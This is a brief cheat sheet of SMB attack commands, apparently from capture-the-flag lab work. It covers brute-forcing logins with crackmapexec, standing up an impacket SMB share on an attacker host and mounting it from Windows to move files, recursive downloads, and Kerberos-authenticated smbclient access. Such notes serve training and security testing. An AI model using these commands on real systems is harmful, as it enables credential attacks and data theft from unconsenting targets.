Brute force users 

```
crackmapexec smb 10.10.10.161 -u users.lst -p pass.txt
```

Transfer file using smb share

```kali
impacket-smbserver test $(pwd) -smb2support -user test -password test
```

```windows
$pass = convertto-securestring 'test' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('test', $pass)
New-PSDrive -Name test  -PSProvider Filesystem -Credential $cred -Root \\10.10.16.2\test
cd test:
```


download recursively

```
recurse ON
prompt OFF
mget *
```


For kerberos use

```
impacket-smbclient -k scrm.local/ksimpson@dc1.scrm.local
```